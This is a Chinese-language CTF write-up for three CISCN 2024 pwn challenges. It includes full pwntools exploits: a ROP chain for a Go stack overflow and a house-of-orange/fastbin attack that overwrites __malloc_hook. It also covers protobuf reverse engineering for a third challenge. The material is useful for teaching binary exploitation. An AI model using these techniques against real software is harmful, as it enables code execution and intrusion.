---
title: ciscn2024初赛-Pwn-wp
date: 2024-05-20 19:45:19
category: wp
tags:
---

> pwn和web题目赛后环境 https://ctf.show/challenges

# pwn
## gostack
### 分析
go语言的栈溢出题，开始用的ida7.5，啥也逆不出来，后面换成ida8.3，都不用怎么逆就出来了
这里放一下ida7.5和ida8.3打开后的截图

![ida7.5](/img/wp/ciscn2024-初赛/gostack-ida7.5.png)

![ida8.3](/img/wp/ciscn2024-初赛/gostack-ida8.3.png)

上面第一张是ida7.5的，第二张是ida8.3的

大致看一下代码，运行一下，用cyclic测量溢出点
go语言运行报错后会直接打印错误的返回地址，就不用gdb调试了
![](/img/wp/ciscn2024-初赛/gostack-cyclic.png)

得出溢出点464
![](/img/wp/ciscn2024-初赛/gostack-cyclic-l.png)

其实main_main_func2就是后门函数，不过懒得看代码了，直接用系统调用获取shell

### exp
```python
from pwn import *

p = process("./gostack")

context.log_level = 'debug'

# ROPgadget
rdi = 0x4a18a5 #0x00000000004a18a5 : pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret
rsi = 0x42138a #0x000000000042138a : pop rsi ; ret
rax = 0x40f984 #0x000000000040f984 : pop rax ; ret
rdx = 0x4944ec #0x00000000004944ec : pop rdx ; ret
ret = 0x40201a #0x000000000040201a : ret
syscall = 0x4616C9 #0x00000000004616C9 : syscall ; ret

addr = 0x5978d8 # 随便找一个能写的地址，不行就换一个

# function
main = 0x04A0AC0

# send
#gdb.attach(p))

# 在addr处写字符串
payload = b'\x00'*464 + p64(rax) + p64(0x0) + p64(rdi) + p64(0) + p64(0)*5 + p64(rsi) + p64(addr) + p64(rdx) + p64(0x30) + p64(syscall)
# 将addr处的字符串作为参数执行sys-execv
payload+= p64(rax) + p64(0x3b) + p64(rdi) + p64(addr) + p64(0)*5 + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(syscall)

p.sendlineafter(b'Input your magic message :',payload)

p.recvuntil(b'Your magic message :')
p.sendline(b'/bin/sh\x00')

p.interactive()

```

## orange_cat_diary
### 分析
house of orange + fastbin attack

一道堆菜单题，但是限制了show和delete的次数
每次add操作后申请的堆内存无编号，都是针对ptr的操作
edit函数内可以多写8个字节，可以改写下一个chunk的size

### 思路
1. 通过edit溢出修改top_chunk的size，然后通过申请较大的chunk将原top chunk置入unsorted bin
2. 通过show泄露unsorted bin的bk指针，这个指针会指向main_arena结构体内部的一个成员，通过main_arena与libc的偏移泄露libc基址
3. 通过伪造chunk进行fastbin attack将堆分配到malloc_hook位置，写上one_gadget
4. 再次调用malloc即可获取shell

#### 修改top chunk的size
关于修改top chunk的size，需要修改后的top chunk的满足以下几个条件
1. 伪造的 size 必须要对齐到内存页
2. size 要大于 MINSIZE(0x10)
3. size 要小于之后申请的 chunk size + MINSIZE(0x10)
4. size 的 prev inuse 位必须为 1

对齐到内存页，即size(no_flag_bit)大小需要为2* SIZE_SZ的整数倍
所以我们修改top chunk的size为0xf91(0b1111 1001 0001)
0xf91最后一位为PRE_INUSE，去掉flag_bit最后4位为零（即满足对齐到内存页），并且大于0x10且小于我们要申请的0x1000

所以可以修改为0xf91

#### 计算main_arena与libc基址的偏移
关于如何计算main_arena与libc的偏移，main_arena是一个全局变量，这里有两种思路可以得知main_arena在libc中的偏移
1. 利用malloc_trim函数，这个函数会访问main_arena，可以通过这个函数在ida中找到偏移
```c
int
__malloc_trim (size_t s)
{
  int result = 0;

  if (__malloc_initialized < 0)
    ptmalloc_init ();

  mstate ar_ptr = &main_arena;//<=here!
  do
    {
      __libc_lock_lock (ar_ptr->mutex);
      result |= mtrim (ar_ptr, s);
      __libc_lock_unlock (ar_ptr->mutex);

      ar_ptr = ar_ptr->next;
    }
  while (ar_ptr != &main_arena);

  return result;
}
```

![](/img/wp/ciscn2024-初赛/malloc_trim.png)
可知本题所用libc与main_arena的偏移为 0x3C4B20

2. 利用malloc_hook算出
main_arena与malloc_hook的地址差为0x10，而malloc_hook的值可以用pwntools直接查到

![](/img/wp/ciscn2024-初赛/malloc_hook_and_main_arena.png)


```python
main_arena_offset = ELF("libc-2.23.so").symbols["__malloc_hook"] + 0x10
```

利用这两种方法之一，便可以算出main_arena在libc中的偏移了，得出偏移为0x3C4B20
再获取bk和main_arena的偏移，即可计算libc_base

#### 计算bk与main_arena的偏移
可以直接调试获取
```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x6549ce9b1000
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x6549ce9b1070
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x6549ce9b1090
Size: 0xf51
fd: 0x7e344694bb78
bk: 0x7e344694bb78

Allocated chunk
Addr: 0x6549ce9b1fe0
Size: 0x10

Allocated chunk | PREV_INUSE
Addr: 0x6549ce9b1ff0
Size: 0x11

Allocated chunk
Addr: 0x6549ce9b2000
Size: 0x00

pwndbg> x/10gx 0x6549ce9b1070
0x6549ce9b1070: 0x6161616161616161      0x0000000000000021
0x6549ce9b1080: 0x6262626262626262      0x00007e344694c188
0x6549ce9b1090: 0x00006549ce9b1070      0x0000000000000f51
0x6549ce9b10a0: 0x00007e344694bb78      0x00007e344694bb78
0x6549ce9b10b0: 0x0000000000000000      0x0000000000000000
pwndbg> x/10gx 0x00007e344694c188
0x7e344694c188 <main_arena+1640>:       0x00007e344694c178      0x00007e344694c178
0x7e344694c198 <main_arena+1656>:       0x00007e344694c188      0x00007e344694c188
0x7e344694c1a8 <main_arena+1672>:       0x00007e344694c198      0x00007e344694c198
0x7e344694c1b8 <main_arena+1688>:       0x00007e344694c1a8      0x00007e344694c1a8
0x7e344694c1c8 <main_arena+1704>:       0x00007e344694c1b8      0x00007e344694c1b8
pwndbg>
```
可知偏移为main_arena+1640

但也可以通过计算获取，首先我们来看一下main_arena的结构体malloc_state
题目的libc是2.23，没有have_fastchunks这个成员，2.27之后新加了该成员，计算时注意一下
```c
struct malloc_state
{
  /* Serialize access.  */
  __libc_lock_define(, mutex);

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Set if the fastbin chunks contain recently inserted free blocks.  */
  /* Note this is a bool but not all targets support atomics on booleans.  */
  int have_fastchunks;//glibc-2.27新加的一个成员

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;

  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;

  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins , help to speed up the process of determinating if a given bin is definitely empty */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state* next;

  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state* next_free;

  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */
  INTERNAL_SIZE_T attached_threads;

  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
};
```

下面分别列出32位与64位该结构体的偏移
|结构体成员                           |i386           |amd64          |
|------------------------------------|---------------|---------------|
|__libc_lock_define(, mutex);        |4B             |4B             |
|int flags;                          |4B             |4B             |
|int have_fastchunks;                |4B             |4B             |
|mfastbinptr fastbinsY[NFASTBINS];   |40B=4B*10      |80B=8B*10      |
|mchunkptr top;                      |4B             |8B             |
|mchunkptr last_remainder;           |4B             |8B             |
|mchunkptr bins[NBINS * 2 - 2];      |1016B=4B*254   |2032B=8B*254   |
|unsigned int binmap[BINMAPSIZE];    |16B=4B*4       |16B=4B*4       |
|struct malloc_state* next;          |4B             |8B             |
|struct malloc_state* next_free;     |4B             |8B             |
|INTERNAL_SIZE_T attached_threads;   |4B             |8B             |
|INTERNAL_SIZE_T system_mem;         |4B             |8B             |
|INTERNAL_SIZE_T max_system_mem;     |4B             |8B             |

bins数组每两位为一组，存放一个chunk的fd和bk
`chunk=bin_at(1)`将`&bins[(i-1)*2]-0x10`返回，之后调用`chunk->fd`即返回`bins[0]`的值，调用`chunk->bk`即返回`bins[1]`的值

|所属bin类型    |bin_at下标|bins下标|数量|
|--------------|----------|--------|---|
|unsorted bin  |1         |0~1     |1  |
|small bin     |2~63      |2~124   |62 |
|large bin     |64~126    |125~253 |63 |

small bin 大小与下标
|bin_at |SIZE_SZ=4(32 位)|SIZE_SZ=8(64 位)|
|-------|----------------|----------------|
|2	    |16B             |32B             |
|3	    |24B             |48B             |
|4	    |32B             |64B             |
|5	    |40B             |80B             |
|x	    |`2*4*x`B        |`2*8*x`B        |
|63	    |504B            |1008B           |

large bin 大小与下标
|bin_at       |组      |数量   |
|-------------|--------|-------|
|64~95        |1       |32     |
|96~111       |2       |16     |
|112~119      |3       |8      |
|120~123      |4       |4      |
|124~125      |5       |2      |
|126          |6       |1      |
```c
#define largebin_index_32(sz)                                                  \
    (((((unsigned long) (sz)) >> 6) <= 38)                                     \
         ? 56 + (((unsigned long) (sz)) >> 6)                                  \
         : ((((unsigned long) (sz)) >> 9) <= 20)                               \
               ? 91 + (((unsigned long) (sz)) >> 9)                            \
               : ((((unsigned long) (sz)) >> 12) <= 10)                        \
                     ? 110 + (((unsigned long) (sz)) >> 12)                    \
                     : ((((unsigned long) (sz)) >> 15) <= 4)                   \
                           ? 119 + (((unsigned long) (sz)) >> 15)              \
                           : ((((unsigned long) (sz)) >> 18) <= 2)             \
                                 ? 124 + (((unsigned long) (sz)) >> 18)        \
                                 : 126)

#define largebin_index_32_big(sz)                                              \
    (((((unsigned long) (sz)) >> 6) <= 45)                                     \
         ? 49 + (((unsigned long) (sz)) >> 6)                                  \
         : ((((unsigned long) (sz)) >> 9) <= 20)                               \
               ? 91 + (((unsigned long) (sz)) >> 9)                            \
               : ((((unsigned long) (sz)) >> 12) <= 10)                        \
                     ? 110 + (((unsigned long) (sz)) >> 12)                    \
                     : ((((unsigned long) (sz)) >> 15) <= 4)                   \
                           ? 119 + (((unsigned long) (sz)) >> 15)              \
                           : ((((unsigned long) (sz)) >> 18) <= 2)             \
                                 ? 124 + (((unsigned long) (sz)) >> 18)        \
                                 : 126)

// XXX It remains to be seen whether it is good to keep the widths of
// XXX the buckets the same or whether it should be scaled by a factor
// XXX of two as well.
#define largebin_index_64(sz)                                                  \
    (((((unsigned long) (sz)) >> 6) <= 48)                                     \
         ? 48 + (((unsigned long) (sz)) >> 6)                                  \
         : ((((unsigned long) (sz)) >> 9) <= 20)                               \
               ? 91 + (((unsigned long) (sz)) >> 9)                            \
               : ((((unsigned long) (sz)) >> 12) <= 10)                        \
                     ? 110 + (((unsigned long) (sz)) >> 12)                    \
                     : ((((unsigned long) (sz)) >> 15) <= 4)                   \
                           ? 119 + (((unsigned long) (sz)) >> 15)              \
                           : ((((unsigned long) (sz)) >> 18) <= 2)             \
                                 ? 124 + (((unsigned long) (sz)) >> 18)        \
                                 : 126)

#define largebin_index(sz)                                                     \
    (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16             \
                                                ? largebin_index_32_big(sz)    \
                                                : largebin_index_32(sz))
```

我们将top chunk的size修改为0xf90，利用申请大chunk将top chunk释放到unsorted bin，再申请一个0x10的chunk时
会先将unsorted bin中的chunk取出，放到相应的small bin或者large bin
本题会将unsorted bin中大小为0xf90的堆块放到large bin，利用largebin_index_64计算得出index为98
而bin_at为98的值对应的bins下标为 `(98-1)*2=194`
所以计算出bk在main_arena的偏移为
```python
word_bytes = context.word_size # i386->word_size=32  amd64->word_size=64
bin_at = 98
bins = (bin_at-1)*2
offset = 4  # lock
offset += 4  # flags
# offset += 4  # have_fastchunks
offset += word_bytes * 10  # fastbinY
offset += word_bytes * 2  # top,last_remainder
offset += word_bytes * bins # offset bins
offset -= word_bytes * 2  # bin overlap
print(offset) #1640
```

最后减去`word_bytes * 2`是因为bins的bk指针指向的是`&bins[(i-1)*2]-0x10`，所以要减去`word_bytes * 2`即0x10
最终计算结果与调试结果一致

bk在main_arena的偏移为1640，main_arena在libc的偏移为0x3C4B20
所以最终偏移为`1640+0x3C4B20=0x3c5188`

#### 分配到malloc_hook
因为程序在free堆块之后没有清空，可以继续写值，那我们就可以修改这个堆块的fd指针指向一个addr
之后申请该大小的堆块之后，对应大小的fastbin指针就会指向fd指针，即addr
再次malloc申请内存时，由于对应的fastbin指针不为NULL，就会将addr作为堆块分配出来，即可实现任意地址写的操作

不过fastbin在分配内存时，会检测指针指向的地方(将其作为malloc_chunk)的size是不是和对应的fastbin大小相等，不是则报错

所以我们要找一个合适的addr，addr处为pre_size，这个可以为任意值，但addr+8必须为对应fastbin的size

下面是源码
```c
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)

/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p)         ((p)->mchunk_size)

#define fastbin_index(sz) \
        ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)

#define REMOVE_FB(fb, victim, pp)			\
  do							\
    {							\
      victim = pp;					\
      if (victim == NULL)				\
	break;						\
    }							\
  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim)) \
	 != victim);					\

  // 如果对齐之后的请求字节(nb)处于fastbin的范围中
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      //fastbin下标
      idx = fastbin_index (nb);
      //对应fastbin的头指针
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp;
      victim = *fb;

      //victim不为空，即对应的fastbin不为空
      if (victim != NULL)
	{
	  if (SINGLE_THREAD_P)
	    *fb = victim->fd;
	  else
	    REMOVE_FB (fb, pp, victim);
	  if (__glibc_likely (victim != NULL))
	    {
        // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。
        // 根据取得的 victim ，利用 chunksize 计算其大小。
        // 利用fastbin_index 计算 chunk 的索引
	    size_t victim_idx = fastbin_index (chunksize (victim)); //这一句是检测的关键，我们要使计算后的victim_idx和idx相等

        //检测
	      if (__builtin_expect (victim_idx != idx, 0))
		malloc_printerr ("malloc(): memory corruption (fast)");

        //更细致的检查，只在-DMALLOC_DEBUG时使用
	      check_remalloced_chunk (av, victim, nb);
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
		{
		  mchunkptr tc_victim;

		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count
			 && (tc_victim = *fb) != NULL)
		    {
		      if (SINGLE_THREAD_P)
			*fb = tc_victim->fd;
		      else
			{
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx);
		    }
		}
#endif
	      void *p = chunk2mem (victim);
	      alloc_perturb (p, bytes);
	      return p;
	    }
	}
  // 对应的fastbin为空，检查smallbin
    }
```

我们调试一下看看__malloc_hook上方有没有满足要求的值 
```
pwndbg> x/10gx (uint64_t)&__malloc_hook-0x23
0x7c63ee9ebaed <_IO_wide_data_0+301>:   0x63ee9ea260000000      0x000000000000007c
0x7c63ee9ebafd: 0x63ee6acea0000000      0x63ee6aca7000007c
0x7c63ee9ebb0d <__realloc_hook+5>:      0x000000000000007c      0x0000000000000000
0x7c63ee9ebb1d: 0x0000000000000000      0x0000000000000000
0x7c63ee9ebb2d <main_arena+13>: 0x0000000000000000      0x0000000000000000
```
我们看到，在__malloc__hook(地址为0x7c63ee9ebb10)的上方(__malloc__hook - 0x23 + 0x8)刚好有个0x7c(0b0111 1100)
我们计算一下 size_t victim_idx = fastbin_index (chunksize (victim));

```
chunksize_nomask(p) -> 0x7c(0b0111 1100)
chunksize(p) -> 0x78(0b0111 1000)
fast_index(sz)  -> ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) 
                -> ((((unsigned int) (sz)) >> 4) - 2) 
                -> (0x7)0b0111 - 2
                -> 5
```

|fastbinY   |32位chunk_size|64位chunk_size|
|-----------|--------------|--------------|
|fastbinY[0]|0x18          |0x20          |
|fastbinY[1]|0x20          |0x30          |
|fastbinY[2]|0x28          |0x40          |
|fastbinY[3]|0x30          |0x50          |
|fastbinY[4]|0x38          |0x60          |
|fastbinY[5]|0x40          |0x70          |
|fastbinY[6]|0x48          |0x80          |

即fastbin的idx为5，对应chunk大小为0x70
当我们申请0x60到0x68字节大小的空间时，会先调用一个checked_request2size的宏转为0x70的chunk size
所以我们可以申请0x60~0x68的空间，即可绕过fastbin的检测

申请到的内存会转换为用户内存(+0x10)，所以此时__malloc_hook的位置在申请到的指针的0x13字节之后

### exp
```python
from pwn import *

p = process("./orange_cat_diary")

libc = ELF("./libc-2.23.so")

context.log_level = 'debug'

def add(size,content):
    p.sendlineafter(b'choice:',b'1')
    p.sendafter(b'content:',str(size).encode())
    p.sendafter(b'content:',content)

def show():
    p.sendlineafter(b'choice:',b'2')
    
def delete():
    p.sendlineafter(b'choice:',b'3')

def edit(size,content):
    p.sendlineafter(b'choice:',b'4')
    p.sendafter(b'content:',str(size).encode())
    p.sendafter(b'content:',content)

# gadget
one_gadget1 = 0x4527a
one_gadget2 = 0xf03a4
one_gadget3 = 0xf1247

p.sendlineafter(b"Hello, I'm delighted to meet you. Please tell me your name.",b'zzkkk1h')

#gdb.attach(p)

# 修改top chunk大小
add(0x68,b'aaaa')
edit(0x70,b'a'*0x68+p64(0xf91))

# 申请较大chunk使修改后的top chunk置入unsorted bin
add(0x1000,b'aaaa')

# 从unsorted bin中申请内存，填上8字节数据，show泄露bk指针内容，调试获取bk指针指向位置在main_arena的偏移
add(0x10,b'bbbbbbbb')
show()
p.recvuntil(b'bbbbbbbb')
libc_base = u64(p.recv(6).ljust(8,b'\x00'))-(1640+0x3C4B20)
print(hex(libc_base))

# 计算 malloc_hook 和 one_gadget 的地址
malloc_hook = libc_base + libc.sym["__malloc_hook"]
one_gadget = libc_base + one_gadget2

# 申请内存块
add(0x68,b'cccc')

# 删除刚刚申请的堆块，放入fastbin中
delete()

# 在fd指针位置写上malloc_hook-0x23的值，这个地址+8后刚好为0x7c，可以申请0x68大小的空间
edit(0x68,p64(malloc_hook-0x23))
add(0x68,b'dddd')

# 0x13字节后即为__malloc_hook的位置，写上one_gadget
add(0x68,b'a'*0x13+p64(one_gadget))

# 再次调用malloc就会执行__malloc_hook处的指令，即可获取shell
p.sendlineafter(b'choice:',b'1')
p.sendafter(b'content:',str(0x30).encode())
p.interactive()

```

## ezbuf
### protobuf
#### 简介
> 官方文档：https://protobuf.dev/overview/

Protobuf是一种与语言无关、与平台无关的可扩展机制，用于序列化结构化数据。它类似于 JSON，但体积更小、速度更快，并且会生成本机语言绑定。您只需定义一次数据的结构，然后就可以使用专门生成的源代码轻松地将结构化数据写入各种数据流并使用各种语言读取这些结构化数据。

它支持以下语言
- C++
- C#
- Java
- Kotlin
- Objective-C
- PHP
- Python
- Ruby

其他语言(如C语言)需要额外安装插件

#### 安装
```bash
# 首先安装依赖
sudo apt install git g++ autoconf automake libtool curl make unzip

# 安装 protobuf
git clone https://github.com/protocolbuffers/protobuf.git
cd protobuf
git checkout v3.21.0 # 试过v27.0，protobuf-c装不上，所以用v3.21.0
git submodule update --init --recursive # 安装子模块
./autogen.sh   #生成配置脚本
./configure    # 可选 --prefix=path ，默认路径为/usr/local/
make -j 4          
sudo make install 
sudo ldconfig       # refresh shared library cache
which protoc        # find the location
protoc --version    # check

# 安装 protobuf-c
git clone https://github.com/protobuf-c/protobuf-c.git
cd protobuf-c
./autogen.sh
./configure
make -j 4
sudo make install
```

之后我们会使用 protoc 生成 python 语言的结构化数据，便于利用 pwntools 发送数据

#### 深入分析
首先我们新建一个.proto文件，利用protoc生成一个c语言的代码，查看结构体，了解一下结构体的成员，方便逆向程序中的结构体
```
syntax="proto3"; //proto version 2 or 3

message test{
    bytes a = 1;
    sint64 b = 2;
    uint64 c = 3;
}
```
将上述内容保存为test.proto文件，使用`protoc test.proto --c_out=./`生成相应的c语言代码

```c
static const ProtobufCFieldDescriptor test__field_descriptors[3] =
{
  {
    "a",
    1,
    PROTOBUF_C_LABEL_NONE,
    PROTOBUF_C_TYPE_BYTES,
    0,   /* quantifier_offset */
    offsetof(Test, a),
    NULL,
    NULL,
    0,             /* flags */
    0,NULL,NULL    /* reserved1,reserved2, etc */
  },
  {
    "b",
    2,
    PROTOBUF_C_LABEL_NONE,
    PROTOBUF_C_TYPE_SINT64,
    0,   /* quantifier_offset */
    offsetof(Test, b),
    NULL,
    NULL,
    0,             /* flags */
    0,NULL,NULL    /* reserved1,reserved2, etc */
  },
  {
    "c",
    3,
    PROTOBUF_C_LABEL_NONE,
    PROTOBUF_C_TYPE_UINT64,
    0,   /* quantifier_offset */
    offsetof(Test, c),
    NULL,
    NULL,
    0,             /* flags */
    0,NULL,NULL    /* reserved1,reserved2, etc */
  },
};
static const unsigned test__field_indices_by_name[] = {
  0,   /* field[0] = a */
  1,   /* field[1] = b */
  2,   /* field[2] = c */
};
static const ProtobufCIntRange test__number_ranges[1 + 1] =
{
  { 1, 0 },
  { 0, 3 }
};
const ProtobufCMessageDescriptor test__descriptor =
{
  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,
  "test",
  "Test",
  "Test",
  "",
  sizeof(Test),
  3,
  test__field_descriptors,
  test__field_indices_by_name,
  1,  test__number_ranges,
  (ProtobufCMessageInit) test__init,
  NULL,NULL,NULL    /* reserved[123] */
};
```

生成的文件中涉及到了两个结构体
- ProtobufCMessageDescriptor
```c
/**
 * Describes a message.
 */
struct ProtobufCMessageDescriptor {
	/** Magic value checked to ensure that the API is used correctly. */
	uint32_t			magic;

	/** The qualified name (e.g., "namespace.Type"). */
	const char			*name;
	/** The unqualified name as given in the .proto file (e.g., "Type"). */
	const char			*short_name;
	/** Identifier used in generated C code. */
	const char			*c_name;
	/** The dot-separated namespace. */
	const char			*package_name;

	/**
	 * Size in bytes of the C structure representing an instance of this
	 * type of message.
	 */
	size_t				sizeof_message;

	/** Number of elements in `fields`. */
	unsigned			n_fields;
	/** Field descriptors, sorted by tag number. */
	const ProtobufCFieldDescriptor	*fields;
	/** Used for looking up fields by name. */
	const unsigned			*fields_sorted_by_name;

	/** Number of elements in `field_ranges`. */
	unsigned			n_field_ranges;
	/** Used for looking up fields by id. */
	const ProtobufCIntRange		*field_ranges;

	/** Message initialisation function. */
	ProtobufCMessageInit		message_init;

	/** Reserved for future use. */
	void				*reserved1;
	/** Reserved for future use. */
	void				*reserved2;
	/** Reserved for future use. */
	void				*reserved3;
};
```
- ProtobufCFieldDescriptor
```c
struct ProtobufCFieldDescriptor {
	/** Name of the field as given in the .proto file. */
	const char		*name;
	/** Tag value of the field as given in the .proto file. */
	uint32_t		id;
	/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */
	ProtobufCLabel		label;
	/** The type of the field. */
	ProtobufCType		type;
	/**
	 * The offset in bytes of the message's C structure's quantifier field
	 * (the `has_MEMBER` field for optional members or the `n_MEMBER` field
	 * for repeated members or the case enum for oneofs).
	 */
	unsigned		quantifier_offset;
	/**
	 * The offset in bytes into the message's C structure for the member
	 * itself.
	 */
	unsigned		offset;
	/**
	 * A type-specific descriptor.
	 *
	 * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the
	 * corresponding `ProtobufCEnumDescriptor`.
	 *
	 * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to
	 * the corresponding `ProtobufCMessageDescriptor`.
	 *
	 * Otherwise this field is NULL.
	 */
	const void		*descriptor; /* for MESSAGE and ENUM types */
	/** The default value for this field, if defined. May be NULL. */
	const void		*default_value;
	/**
	 * A flag word. Zero or more of the bits defined in the
	 * `ProtobufCFieldFlag` enum may be set.
	 */
	uint32_t		flags;
	/** Reserved for future use. */
	unsigned		reserved_flags;
	/** Reserved for future use. */
	void			*reserved2;
	/** Reserved for future use. */
	void			*reserved3;
};
```
结构体中又涉及到了一个枚举类型 ProtobufCType
```c
typedef enum {
	PROTOBUF_C_TYPE_INT32,      /**< int32 */
	PROTOBUF_C_TYPE_SINT32,     /**< signed int32 */
	PROTOBUF_C_TYPE_SFIXED32,   /**< signed int32 (4 bytes) */
	PROTOBUF_C_TYPE_INT64,      /**< int64 */
	PROTOBUF_C_TYPE_SINT64,     /**< signed int64 */
	PROTOBUF_C_TYPE_SFIXED64,   /**< signed int64 (8 bytes) */
	PROTOBUF_C_TYPE_UINT32,     /**< unsigned int32 */
	PROTOBUF_C_TYPE_FIXED32,    /**< unsigned int32 (4 bytes) */
	PROTOBUF_C_TYPE_UINT64,     /**< unsigned int64 */
	PROTOBUF_C_TYPE_FIXED64,    /**< unsigned int64 (8 bytes) */
	PROTOBUF_C_TYPE_FLOAT,      /**< float */
	PROTOBUF_C_TYPE_DOUBLE,     /**< double */
	PROTOBUF_C_TYPE_BOOL,       /**< boolean */
	PROTOBUF_C_TYPE_ENUM,       /**< enumerated type */
	PROTOBUF_C_TYPE_STRING,     /**< UTF-8 or ASCII string */
	PROTOBUF_C_TYPE_BYTES,      /**< arbitrary byte sequence */
	PROTOBUF_C_TYPE_MESSAGE,    /**< nested message */
} ProtobufCType;
```
更多相关信息请查看 [protobuf-c](https://protobuf-c.github.io/protobuf-c)
利用这两个结构体和这个类型枚举便可以开始逆向程序了

### 程序逆向
#### protobuf message逆向
分析ProtobufCMessageDescriptor
![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-ProtobufCMessageDescriptor.png)

我在ida中还原了 ProtobufCMessageDescriptor 结构体，便于观察，实际做题可以不用还原
![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-structure-insert.png)

再将之前数据段的变量的类型转为该结构体，得到如下结果
![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-data-struct.png)

发现n_fileds为5,表明其中含有5个变量，点进fields分析每个field

![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-ProtobufCFieldDescriptor-field1.png)

分析出第一个变量为bytes型，名为whatcon的变量，按照这样的方法依次提取出所有field，写到heybro.proto文件中
```
syntax="proto3"; //proto version 2 or 3

message heybro{
    bytes whatcon = 1;
    sint64 whattodo = 2;
    sint64 whatidx = 3;
    sint64 whatsize = 4;
    uint32 whatsthis = 5;
}
```

利用`protoc heybro.proto --python_out=./`命令生成python语言的代码，得到一个python文件，可以在exp中导入，构建相应的protobuf包

生成的heybro_pb2.py文件
```python
# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: heybro.proto
"""Generated protocol buffer code."""
from google.protobuf.internal import builder as _builder
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x0cheybro.proto\"a\n\x06heybro\x12\x0f\n\x07whatcon\x18\x01 \x01(\x0c\x12\x10\n\x08whattodo\x18\x02 \x01(\x12\x12\x0f\n\x07whatidx\x18\x03 \x01(\x12\x12\x10\n\x08whatsize\x18\x04 \x01(\x12\x12\x11\n\twhatsthis\x18\x05 \x01(\rb\x06proto3')

_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'heybro_pb2', globals())
if _descriptor._USE_C_DESCRIPTORS == False:

  DESCRIPTOR._options = None
  _HEYBRO._serialized_start=16
  _HEYBRO._serialized_end=113
# @@protoc_insertion_point(module_scope)
```

#### python使用protobuf
```python
import heybro_pb2
data = heybro_pb2.heybro() # 方法名称跟随.proto中结构体名称变化
data.whattodo = todo
data.whatcon = content
data.whatidx = index
data.whatsize = size
data.whatsthis = this
data.SerializeToString() # 转换成bytes
```

#### 静态分析
先看看主函数，稍微改了点名字，加了点注释
![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-main.png)

再看看menu函数
![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-menu.png)

#### 动态分析
首先编写交互逻辑，主要是将create函数和show函数用python实现出来
```python
from pwn import *
import heybro_pb2

p = process("./pwn")

context.log_level = 'debug'
#context.terminal = ['tmux','splitw','-h']

def create(idx,content):
    data = heybro_pb2.heybro()
    data.whattodo = 1
    data.whatcon = content
    data.whatidx = idx
    data.whatsize = 0
    data.whatsthis = 0
    data = data.SerializeToString()
    p.recvuntil(b'WANT?\n')
    p.send(data)
 
def delete(idx):
    data = heybro_pb2.heybro()
    data.whattodo = 2
    data.whatcon = b'0'
    data.whatidx = idx
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b'WANT?\n')
    p.send(data)
 
def show(idx):
    data = heybro_pb2.heybro()
    data.whattodo = 3
    data.whatcon = b'0'
    data.whatidx = idx
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b'WANT?\n')
    p.send(data)
 
def do_nothing(content):
    data = heybro_pb2.heybro()
    data.whattodo = 0
    data.whatcon = content
    data.whatidx = 1
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b'WANT?\n')
    p.send(data)    

gdb.attach(p)
create(0,b'aaaaaaaa')
show(0)

p.interactive()
```
编写这样的程序，调试运行。将运行菜单函数前后的堆打印出来比较，主要有两处不同
![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-heap-cmp-1.png)
